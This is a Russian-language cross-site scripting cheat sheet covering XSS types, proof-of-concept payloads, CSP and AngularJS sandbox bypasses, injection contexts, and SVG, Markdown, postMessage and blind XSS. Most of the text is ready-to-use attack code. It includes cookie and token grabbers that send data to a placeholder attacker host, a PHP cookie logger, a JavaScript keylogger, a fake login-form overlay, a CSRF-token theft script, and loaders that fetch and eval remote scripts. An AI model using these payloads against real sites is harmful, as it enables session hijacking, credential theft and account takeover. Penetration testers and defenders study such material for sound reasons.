# Межсайтовый скриптинг (Cross-Site Scripting, XSS)

> Межсайтовый скриптинг (XSS) — это тип уязвимости компьютерной безопасности, обычно встречающийся в веб-приложениях. XSS позволяет злоумышленникам внедрять вредоносный код на веб-сайт, который затем выполняется в браузере любого, кто посещает этот сайт. Это может позволить злоумышленникам украсть конфиденциальную информацию, такую как учётные данные пользователя, или выполнять другие вредоносные действия.

# Содержание

- [Методология](#Методология)
- [Proof of Concept (PoC)](#Proof-of-Concept-PoC)
  - [Перехват данных (Data Grabber)](#Перехват-данных-Data-Grabber)
  - [CORS](#CORS)
  - [Подмена UI (UI Redressing)](#Подмена-UI-UI-Redressing)
  - [JavaScript-кейлоггер](#JavaScript-кейлоггер)
  - [XSS to bypass CSRF defenses](#XSS-to-bypass-CSRF-defenses)
  - [Dangling markup injection](#Dangling-markup-injection)
  - [Другие способы](#Другие-способы)
- [Идентификация XSS-точки входа](#Идентификация-XSS-точки-входа)
  - [Инструменты](#Инструменты)
- [Политика безопасности контента (Content Security Policy, CSP)](#Политика-безопасности-контента-Content-Security-Policy-CSP)
  - [Обход CSP с помощью инъекции политики](#Обход-CSP-с-помощью-инъекции-политики)
- [Клиентская шаблонная инъекция (Client-side template injection)](#Клиентская-шаблонная-инъекция-Client-side-template-injection)
  - [Создание продвинутого обхода песочницы AngularJS](#Создание-продвинутого-обхода-песочницы-AngularJS)
  - [Как работает обход CSP в AngularJS](#Как-работает-обход-CSP-в-AngularJS)
- [Контексты межсайтового скриптинга (XSS)](#Контексты-межсайтового-скриптинга-XSS) 
- [XSS в HTML/приложениях](#XSS-в-HTMLприложениях)
  - [Распространённые полезные нагрузки](#Распространённые-полезные-нагрузки)
  - [XSS с использованием HTML5-тегов](#XSS-с-использованием-HTML5-тегов)
  - [XSS с использованием удалённого JS](#XSS-с-использованием-удалённого-JS)
  - [XSS в скрытых полях (Hidden Input)](#XSS-в-скрытых-полях-Hidden-Input)
  - [XSS при выводе в верхнем регистре](#XSS-при-выводе-в-верхнем-регистре)
  - [DOM-based XSS](#DOM-based-XSS)
  - [XSS в контексте JavaScript](#XSS-в-контексте-JavaScript)
- [XSS в обёртках URI](#XSS-в-обёртках-URI)
  - [Обёртка javascript:](#Обёртка-javascript)
  - [Обёртка data:](#Обёртка-data)
  - [Обёртка vbscript:](#Обёртка-vbscript)
- [XSS в файлах](#XSS-в-файлах)
  - [XSS в XML](#XSS-в-XML)
  - [XSS в SVG](#XSS-в-SVG)
  - [XSS в Markdown](#XSS-в-Markdown)
  - [XSS в CSS](#XSS-в-CSS)
- [XSS в PostMessage](#XSS-в-PostMessage)
- [Blind XSS](#Blind-XSS)
  - [XSS Hunter](#XSS-Hunter)
  - [Другие инструменты для Blind XSS](#Другие-инструменты-для-Blind-XSS)
  - [Точки входа для Blind XSS](#Точки-входа-для-Blind-XSS)
  - [Советы](#Советы)
- [Mutated XSS](#Mutated-XSS)
- [Защита от XSS](#Защита-от-XSS)
- [Ссылки](#Ссылки)

**3 основных типа XSS-атак**

| Тип | Описание |
|---|---|
| **Reflected XSS (Отражённый)** | Вредоносный код встроен в ссылку, отправленную жертве. Когда жертва переходит по ссылке, код выполняется в её браузере. Например, злоумышленник может создать ссылку, содержащую вредоносный JavaScript, и отправить её жертве по электронной почте. Когда жертва переходит по ссылке, код выполняется, позволяя злоумышленнику украсть учётные данные. |
| **Stored XSS (Сохранённый)** | Вредоносный код сохраняется на сервере и выполняется каждый раз при доступе к уязвимой странице. Например, злоумышленник может внедрить вредоносный код в комментарий к записи в блоге. Когда другие пользователи просматривают запись, код выполняется в их браузерах. |
| **DOM-based XSS** | Возникает, когда уязвимое веб-приложение изменяет DOM (Document Object Model) в браузере пользователя. Вредоносный код не отправляется на сервер, а выполняется непосредственно в браузере пользователя. Это может затруднить обнаружение и предотвращение таких атак, поскольку сервер не имеет записи о вредоносном коде. |

* **Некоторые варианты обхода защиты**

*  Дублирование тегов — <script><script> или <scr<script>ipt>.
*  Использование строчных и прописных букв в нагрузке — <ScRIpt>alert(1)</SCRIPt>.
*  Использование   вместо ( ) — <script>alert1</script>.
*  Использование различных кодировок нагрузки — Unicode, HTML, URL, Base64, HEX.
*  Использование двойного кодирования нагрузки — вместо %3Cscript%3Ealert%281%29%3C%2Fscript%3E используется %253Cscript%253Ealert%25281%2529%253C%252Fscript%253E.
*  Использование Polyglot — javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>.


# Proof of Concept (PoC)

> При эксплуатации XSS-уязвимости более эффективно демонстрировать полноценный сценарий атаки, который может привести к захвату аккаунта или хищению данных. Вместо простого отчёта с `alert()`, надо постараться захватывать ценные данные, такие как платёжная информация, персональные данные (PII), сессионные cookie или учётные данные. При использовании Chrome, есть небольшая заминка. Начиная с версии 92 (20 июля 2021 г.), iframe из разных источников не могут вызывать alert(). Поскольку они используются для создания некоторых более сложных XSS-атак. Придется использовать альтернативную полезную нагрузку PoC `функцию print()`.

### Перехват данных (Data Grabber)

Следующие полезные нагрузки отправляют cookie администратора или чувствительный токен доступа на контролируемую страницу:

```html
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
```
[Прим.](Прим):
Чтобы отловить все события на странице DevTools-Console-monitorEvents(window, 'click') 

**Скрипт для записи собранных данных в файл (PHP):**

```php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
```

## CORS

```html
<script>
  fetch('https://[ATTACKER.DOMAIN.TLD]', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>
```

## Подмена UI (UI Redressing)

XSS для изменения HTML-содержимого страницы и отображения поддельной формы входа:

```html
<script>
history.replaceState(null, null, '../../../login');
document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>"
</script>
```

## JavaScript-кейлоггер

Кейлоггер перехватывает нажатия клавиш и отправляет их:

```html
<img src=x onerror='document.onkeypress=function(e){fetch("http://[ATTACKER.DOMAIN.TLD]/?k="+String.fromCharCode(e.which))},this.remove();'>
```
## XSS to bypass CSRF defenses
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
## Dangling markup injection

```python
<body>
<script>
const academyFrontend = "https://targetsite.com/";
const exploitServer = "https://exploit/exploit";

// Extract the CSRF token from the URL.
const url = new URL(location);
const csrf = url.searchParams.get('csrf');

// Check if a CSRF token was found in the URL.
if (csrf) {
    // If a CSRF token is present, create dynamic form elements to perform the attack.
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');

    // Set the name and value of the CSRF token input to utilize the extracted token for bypassing security measures.
    token.name = 'csrf';
    token.value = csrf;

    // Configure the new email address intended to replace the user's current email.
    email.name = 'email';
    email.value = 'hacker@evil-user.net';

    // Set the form attributes, append the form to the document, and configure it to automatically submit.
    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;
    form.append(email);
    form.append(token);
    document.documentElement.append(form);
    form.submit();

    // If no CSRF token is present, redirect the browser to a crafted URL that embeds a clickable button designed to expose or generate a CSRF token by making the user trigger a GET request
} else {
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
</script>
</body>
```
## Другие способы

Больше эксплойтов можно найти на [http://www.xss-payloads.com/payloads-list.html?a#category=all](http://www.xss-payloads.com/payloads-list.html?a#category=all):

- [Создание скриншотов через XSS и HTML5 Canvas](https://web.archive.org/web/20120426084546/https://www.idontplaydarts.com/2012/04/taking-screenshots-using-xss-and-the-html5-canvas/)
- [JavaScript-сканер портов](http://www.gnucitizen.org/blog/javascript-port-scanner/)
- [Сканер сети](http://www.xss-payloads.com/payloads/scripts/websocketsnetworkscan.js.html)
- [Выполнение .NET Shell](http://www.xss-payloads.com/payloads/scripts/dotnetexec.js.html)
- [Перенаправление формы](http://www.xss-payloads.com/payloads/scripts/redirectform.js.html)
- [Воспроизведение музыки](http://www.xss-payloads.com/payloads/scripts/playmusic.js.html)


# Идентификация XSS-точки входа

* **Точки входа**
    * Между HTML-тегами: `<title>any_code; YOUR_DATA; any_code</title>`.
    * В HTML-атрибутах: `<a any_attribute="any_data YOUR_DATA"></a>`.
    * Между JavaScript-тегами: `<script>any_code; YOUR_DATA; any_code</script>`.
    * Внутри JavaScript-строки: `<script>a = "some"; b="some1 YOUR_DATA"</script>`.
    * Параметры запроса — `search`.
    * Заголовки запроса
    * Название прикрепляемых файлов.
    
Эта полезная нагрузка открывает отладчик в консоли разработчика вместо всплывающего окна:

```html
<script>debugger;</script>
```

Современные приложения с хостингом контента могут использовать **песочницы (sandbox domains)** для безопасного размещения пользовательского контента. 

> Многие из них изолируют загруженный HTML, JavaScript или Flash, чтобы они не могли получить доступ к пользовательским данным.

**Поэтому лучше использовать `alert(document.domain)` или `alert(window.origin)`, а не `alert(1)`, чтобы понять, в каком контексте выполняется XSS.**

* **Лучшая полезная нагрузка вместо `<script>alert(1)</script>`:**

```html
<script>alert(document.domain.concat("\n").concat(window.origin))</script>
```

* **Использование `console.log()` вместо `alert()`** для отражённого XSS, чтобы не закрывать всплывающие окна при каждом выполнении (для сохранённого XSS):

```html
<script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>
```

Дополнительное чтение:

- [Google Bughunter University - XSS in sandbox domains](https://sites.google.com/site/bughunteruniversity/nonvuln/xss-in-sandbox-domains)
- [LiveOverflow Video - DO NOT USE alert(1) for XSS](https://www.youtube.com/watch?v=1d9W0lK9R4E)
- [LiveOverflow blog post - DO NOT USE alert(1) for XSS](https://liveoverflow.com/do-not-use-alert1-for-xss/)



**Инструменты**

Большинство инструментов также подходят для Blind XSS:

| Инструмент | Описание |
|---|---|
| [XSSStrike](https://github.com/s0md3v/XSStrike) | Очень популярный, но, к сожалению, не очень хорошо поддерживаемый |
| [xsser](https://github.com/epsylon/xsser) | Использует headless-браузер для обнаружения XSS-уязвимостей |
| [Dalfox](https://github.com/hahwul/dalfox) | Обширная функциональность и очень быстрый благодаря реализации на Go |
| [XSpear](https://github.com/hahwul/XSpear) | Похож на Dalfox, но на Ruby |
| [domdig](https://github.com/fcavallarin/domdig) | Тестер XSS на базе Headless Chrome |

# Политика безопасности контента (Content Security Policy, CSP)

> `CSP` — это механизм безопасности браузера, направленный на смягчение XSS и некоторых других атак. Он работает путём ограничения ресурсов (таких как скрипты и изображения), которые может загружать страница, а также ограничения возможности встраивания страницы в другие страницы (фрейминг). HTTP-заголовок `Content-Security-Policy` со значением, содержащим политику. Сама политика состоит из одной или нескольких директив, разделённых точкой с запятой.

* `script-src 'self'` - разрешит загрузку скриптов только с того же источника, что и сама страница
* `script-src https://scripts.normal-website.com` - разрешит загрузку скриптов только с конкретного домена
* `img-src 'self'` - разрешит загрузку изображений только с того же источника, что и сама страница
* `frame-ancestors 'self'` - разрешит встраивание страницы только в другие страницы с того же источника
* `frame-ancestors 'none'` - запретит встраивание полностью
* `Nonce` - это случайная строка, которая добавляется как атрибут скрипта или ресурса. Скрипт будет выполнен только в том случае, если случайная строка совпадает с сгенерированной сервером. Для эффективного контроля nonce должен генерироваться безопасно при каждой загрузке страницы и не должен быть угадываемым для злоумышленника. |
* `hash` - Директива CSP может указывать хэш содержимого доверенного скрипта. Если хэш фактического скрипта не совпадает со значением, указанным в директиве, скрипт не будет выполнен. Если содержимое скрипта изменится, необходимо будет обновить значение хэша в директиве.
*  `self` — указывает, что ресурсы могут загружаться только с текущего домена. Обычно используется для ограничения загрузки ресурсов внутри iframe.
*  `data` — позволяет загружать данные только с текущего домена. Это может быть полезно для ограничения загрузки файлов куки или других чувствительных данных.
*  `none` — запрещает загрузку ресурсов. Она может использоваться для полного отключения загрузки ресурсов с определённого домена.
*  `wildcard` — используется для указания звёздочки * в качестве подстановочного знака для любого количества символов в строке. Она может быть использована для загрузки ресурсов из разных доменов или для загрузки ресурсов, которые начинаются с определённой строки.
*  `unsafe-inline` — загрузка ресурсов, исполняемых в контексте содержащего элемента, возможна без предварительной загрузки.
*  `unsafe-eval` — выполнение JavaScript возможно без предварительной загрузки и проверки источника.
*  `https` — позволяет загружать ресурсы только через HTTPS-соединение.
*  `object-src` — контролирует источники загрузки плагинов.
*  `default-src` — определяет, откуда можно загружать контент по умолчанию. Если она не указана, то контент может загружаться с любого домена.
*  `report-uri` — указывает URI, на который будут отправляться отчёты об ошибках CSP. Например, report-uri: https://debug.yandex.ru — при нарушении CSP будет отправлен отчёт на debug.yandex.ru.

## Обход CSP с помощью инъекции политики

> Если сайт отражает ввод в саму политику `report-uri`, можено внедрить точку с запятой, чтобы добавить свои собственные директивы CSP.

```python
<script>alert(1)</script>&token=;script-src-elem%20%27unsafe-inline%27
```
* `script-src` - контролирует ВСЕ скрипты (элементы, события, eval)
* `script-src-elem` - контролирует только <script> элементы


> Обычно невозможно перезаписать существующую директиву `script-src`. Однако Chrome недавно представил директиву `script-src-elem`, которая позволяет контролировать элементы скриптов, но не события. Что важно, эта новая директива позволяет перезаписывать существующие директивы `script-src`.

# Клиентская шаблонная инъекция (Client-side template injection)

> возникают, когда приложения, использующие клиентский шаблонный фреймворк, динамически встраивают пользовательский ввод в веб-страницы. При рендеринге страницы фреймворк сканирует её на наличие шаблонных выражений и выполняет все, что находит. 

* `Песочница AngularJS` — это механизм, который предотвращает доступ к потенциально опасным объектам, таким как `window` или `document`, в шаблонных выражениях AngularJS. Он также предотвращает доступ к потенциально опасным свойствам, таким как `__proto__`. Несмотря на то, что команда AngularJS не считает песочницу границей безопасности, более широкое сообщество разработчиков придерживается иного мнения. (была окончательно удалена из AngularJS в версии 1.6. Однако многие устаревшие приложения всё ещё используют старые версии AngularJS и могут быть уязвимы.)

## Создание продвинутого обхода песочницы AngularJS

```javascript
1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```
* `toString()` - преобразует объект в строку.
* `charAt` - Метод строк, который возвращает символ по указанному индексу.
* `[].join` - Метод массивов, который соединяет все элементы в одну строку.
```python
var dangerous = "alert(1)";

// До подмены:
dangerous.charAt(0); // "a" - проверка видит только букву
dangerous.charAt(1); // "l" - следующая буква

// После подмены:
dangerous.charAt(0); // "alert(1)" - проверка видит ВСЮ строку
dangerous.charAt(1); // "alert(1)" - опять ВСЮ строку
```
* `orderBy` - В AngularJS фильтр для сортировки массивов. может принимать выражение как аргумент и выполнять его. `[массив] | orderBy : выражение_для_сортировки`
* `.fromCharCode(120,61,97,108,101,114,116,40,49,41)` - Метод String, который создает строку из кодов символов. `x=alert(1)`
* `=1` - завершение выражения

## Как работает обход CSP в AngularJS?
```
location='site.com/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
```
* `ng-focus` - директива, которая выполняет код, когда элемент получает фокус.
* `$event` -  Специальная переменная AngularJS, которая содержит объект события браузера.
* `composedPath()` - Метод объекта события, который возвращает путь события - массив всех элементов, через которые прошло событие.
```javascript
// Когда input получает фокус
$event.composedPath() возвращает:
[
  input#x,     // индекс 0 - сам элемент
  div,         // индекс 1 - родитель
  body,        // индекс 2 - body
  html,        // индекс 3 - корневой элемент
  document,    // индекс 4 - документ
  window       // индекс 5 - ГЛОБАЛЬНЫЙ ОБЪЕКТ
]
```
* `(z=alert)(document.cookie)` - AngularJS отслеживает прямые вызовы опасных функций. Присваивание - это не вызов, поэтому оно проходит проверку.
```javascript
// Это эквивалентно:
(z = alert)(document.cookie)
// Сначала выполняется z = alert
// Потом z(document.cookie)
// Что равно alert(document.cookie)
``` 
# Контексты межсайтового скриптинга (XSS)

| № | Контекст | Техника | Пример эксплойта | Краткое описание |
|---|---|---|---|---|
| 1 | Между HTML-тегами | Скрипт-тег | `<script>alert(document.domain)</script>` | Классическое внедрение скрипта |
| 2 | Между HTML-тегами | Изображение с onerror | `<img src=1 onerror=alert(1)>` | Срабатывает при ошибке загрузки изображения |
| 3 | В атрибуте тега | Закрытие кавычки и тега | `"><script>alert(document.domain)</script>` | Завершаем значение атрибута, закрываем тег, внедряем новый |
| 4 | В атрибуте тега | Обработчик события + autofocus | `" autofocus onfocus=alert(document.domain) x="` | Добавляем обработчик, autofocus для автоматического срабатывания |
| 5 | В атрибуте href | Псевдопротокол javascript: | `<a href="javascript:alert(document.domain)">` | Выполнение JS через ссылку |
| 6 | В атрибуте тега (канонический тег) | Access key | `<link rel="canonical" accesskey="X" onclick="alert(1)">` | Вызов через сочетание клавиш (Ctrl+Shift+X) |
| 7 | В JavaScript (внутри скрипта) | Закрытие script-тега | `</script><img src=1 onerror=alert(document.domain)>` | Закрываем текущий скрипт, внедряем свой HTML |
| 8 | В строке JavaScript | Выход через кавычки | `';alert(document.domain)//` | Закрываем строку кавычкой, выполняем код, комментируем остаток |
| 9 | В строке JavaScript | Выход через дефис | `'-alert(document.domain)-'` | Альтернативный способ закрытия строки |
| 10 | В строке JavaScript | Обход экранирования обратного слеша | `\\';alert(document.domain)//` | Нейтрализуем добавленный приложением обратный слеш |
| 11 | В JavaScript (ограничение символов) | Без круглых скобок (throw) | `onerror=alert;throw 1` | Вызов функции через глобальный обработчик исключений |
| 12 | В обработчике события (onclick) | HTML-сущность вместо кавычек | `&apos;-alert(document.domain)-&apos;` | Браузер декодирует &apos; как ' при обработке атрибута |
| 13 | В шаблонном литерале | Встраивание выражения | `${alert(document.domain)}` | Вставка выражения в шаблонный литерал через ${...} |
| 14 | Клиентская шаблонизация (AngularJS) | Внедрение шаблонного выражения | `{{constructor.constructor('alert(1)')()}}` | Использование синтаксиса шаблонизатора для выполнения кода |


# XSS в HTML/приложениях

## Распространённые полезные нагрузки

**Использование HTML-кодирования**
```javascript
<a href="#" onclick="... var input='&apos;-alert(document.domain)-&apos;'; ...">
```
Последовательность `&apos;` — это HTML-сущность, представляющая апостроф или одиночную кавычку. Поскольку браузер выполняет HTML-декодирование значения атрибута `onclick` перед интерпретацией JavaScript, сущности декодируются как кавычки, которые становятся разделителями строк, и атака успешна.

**Кастом:**
```javascript
location='/site/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x'
```
**Базовые полезные нагрузки:**

```javascript
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..toString(30))(983801..toString(36))</script>
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">
```

**Полезные нагрузки с тегом `<img>`:**

```javascript
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
<><img src=1 onerror=alert(1)>
```

**Полезные нагрузки с тегом `<svg>`:**

```javascript
"><svg><animatetransform onbegin=alert(1)
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<svg><script href=data:,alert(1) />
<svg><script>alert('33')
<svg><script>alert&lpar;'33'&rpar;
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```

**Полезные нагрузки с тегом `<div>`:**

```javascript
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>
```

**Полезные нагрузки с тегом `href` тега `<a>`:**

```javascript
<a href="javascript:alert(document.domain)">
```
## XSS с использованием HTML5-тегов

```javascript
<body onload=alert(/XSS/.source)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<video src=_ onloadstart="alert(1)">
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>

<body ontouchstart=alert(1)>  <!-- Срабатывает при касании экрана -->
<body ontouchend=alert(1)>    <!-- Срабатывает при отпускании экрана -->
<body ontouchmove=alert(1)>   <!-- При перетаскивании пальца по экрану -->
```

---

## XSS с использованием удалённого JS

```javascript
<svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
<script src=14.rs>
<!-- Можно указать произвольную полезную нагрузку через 14.rs/#payload -->
<!-- Например: 14.rs/#alert(document.domain) -->
```

---

## XSS в скрытых полях (Hidden Input)

```javascript
<input type="hidden" accesskey="X" onclick="alert(1)">
<!-- Используйте CTRL+SHIFT+X для активации onclick -->

<!-- В новых браузерах (Firefox 130+, Chrome 108+) -->
<input type="hidden" oncontentvisibilityautostatechange="alert(1)" style="content-visibility:auto">
```

---

## XSS при выводе в верхнем регистре

```javascript
<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
```

---

## DOM-based XSS

На основе источника (sink) DOM XSS:

```javascript
#"><img src=/ onerror=alert(2)>
```

---

## XSS в контексте JavaScript

```javascript
-(confirm)(document.domain)//
; alert(1);//
" autofocus onfocus=alert(document.domain) x="
'-alert(document.domain)-'
';alert(document.domain)//
```

---

# XSS в обёртках URI
```javascript
&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+''{x:'
```
## Обёртка javascript:

```javascript
javascript:prompt(1)
```

**Кодировки:**

```javascript
%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341

&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41
```

**Hex/Octal кодирование:**

```javascript
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
\152\141\166\141\163\143\162\151\160\164\072alert(1)
```

**Символы новой строки:**

```javascript
java%0ascript:alert(1)   - LF (\n)
java%09script:alert(1)   - Horizontal tab (\t)
java%0dscript:alert(1)   - CR (\r)
```

**Использование escape-символов:**

```javascript
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
```

**С новой строкой и комментарием:**

```html
javascript://%0Aalert(1)
javascript://anything%0D%0A%0D%0Awindow.alert(1)
```

---

## Обёртка data:

```javascript
data:text/html,<script>alert(0)</script>
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

---

## Обёртка vbscript (только Internet Explorer)

```javascript
vbscript:msgbox("XSS")
```

---

# XSS в файлах

## XSS в XML

> **Примечание:** Секция CDATA используется, чтобы JavaScript не обрабатывался как XML-разметка.

```xml
<name>
  <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
</name>
```

```xml
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>
</html>
```

---

## XSS в SVG

**Простой скрипт (Зелёный треугольник):**

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

**Комплексная полезная нагрузка (Красная молния):**

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" width="100" height="100" xmlns="http://www.w3.org/2000/svg" onload="alert('svg attribut')">
  <polygon id="lightning" points="0,100 50,25 50,75 100,0" fill="#ff1919" stroke="#ff0000"/>
  <desc><script>alert('svg desc')</script></desc>
  <foreignObject><script>alert('svg foreignObject')</script></foreignObject>
  <foreignObject width="500" height="500">
    <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert('svg foreignObject iframe');" width="400" height="250"/>
  </foreignObject>
  <title><script>alert('svg title')</script></title>
  <animatetransform onbegin="alert('svg animatetransform onbegin')"></animatetransform>
  <script type="text/javascript">
    alert('svg script');
  </script>
</svg>
```

**Короткие SVG-полезные нагрузки:**

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
```

**Вложение SVG и XSS:**

Включение удалённого SVG-изображения в SVG работает, но не вызовет XSS, встроенный в удалённый SVG:

```xml
<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://10.10.10.10:9999/red_lightning_xss_full.svg" height="200" width="200"/>
</svg>
```

Включение фрагмента удалённого SVG не вызовет XSS, так как атрибуты стиля больше не являются вектором в современных браузерах:

```xml
<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <use xlink:href="http://10.10.10.10:9999/red_lightning_xss_full.svg#lightning"/>
</svg>
```

Однако вложение SVG-тегов в SVG-документы работает и позволяет выполнять XSS из под-SVG (Французский флаг):

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <svg x="10">
    <rect x="10" y="10" height="100" width="100" style="fill: #002654"/>
    <script type="text/javascript">alert('sub-svg 1');</script>
  </svg>
  <svg x="200">
    <rect x="10" y="10" height="100" width="100" style="fill: #ED2939"/>
    <script type="text/javascript">alert('sub-svg 2');</script>
  </svg>
</svg>
```

---

## XSS в Markdown

```javascript
[a](javascript:prompt(document.cookie))
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)
```

---

## XSS в CSS

```javascript
<!DOCTYPE html>
<html>
<head>
<style>
div  {
    background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
    background-color: #cccccc;
}
</style>
</head>
  <body>
    <div>lol</div>
  </body>
</html>
```

---

# XSS в PostMessage

Если целевой источник — `*` (звёздочка), сообщение может быть отправлено на любой домен, имеющий ссылку на дочернюю страницу:

```javascript
<html>
<body>
    <input type=button value="Click Me" id="btn">
</body>

<script>
document.getElementById('btn').onclick = function(e){
    window.poc = window.open('http://10.10.10.10/#login');
    setTimeout(function(){
        window.poc.postMessage(
            {
                "sender": "accounts",
                "url": "javascript:confirm('XSS')",
            },
            '*'
        );
    }, 2000);
}
</script>
</html>
```

---

# Blind XSS

## XSS Hunter

> XSS Hunter - позволяет находить все виды XSS-уязвимостей, включая часто пропускаемый Blind XSS. Сервис работает путём размещения специальных XSS-зондов, которые при срабатывании сканируют страницу и отправляют информацию о ней в сервис XSS Hunter.

**Примечание:** [XSS Hunter](https://xsshunter.com) устарел. 

Доступна альтернативная версия:
- Самостоятельная версия: [mandatoryprogrammer/xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)
- Хостинг: [xsshunter.trufflesecurity.com](https://xsshunter.trufflesecurity.com)

**Полезные нагрузки:**

```javascript
"><script src="https://js.rip/[ATTACKER.DOMAIN.TLD]"></script>
"><script src=//[ATTACKER.DOMAIN.TLD]></script>
<script>$.getScript("//[ATTACKER.DOMAIN.TLD]")</script>
```

---

## Другие инструменты для Blind XSS

| Инструмент | Описание |
|---|---|
| [Netflix-Skunkworks/sleepy-puppy](https://github.com/Netflix-Skunkworks/sleepy-puppy) | Фреймворк управления XSS-полезными нагрузками |
| [LewisArdern/bXSS](https://github.com/LewisArdern/bXSS) | Утилита для обнаружения Blind XSS |
| [ssl/ezXSS](https://github.com/ssl/ezXSS) | Простой способ тестирования Blind XSS |

---

## Точки входа для Blind XSS

- Контактные формы
- Системы поддержки (тикеты)
- Заголовок `Referer`
  - Аналитика сайта
  - Логи административной панели
- User Agent
  - Аналитика сайта
  - Логи административной панели
- Комментарии
  - Административная панель

---

## Советы

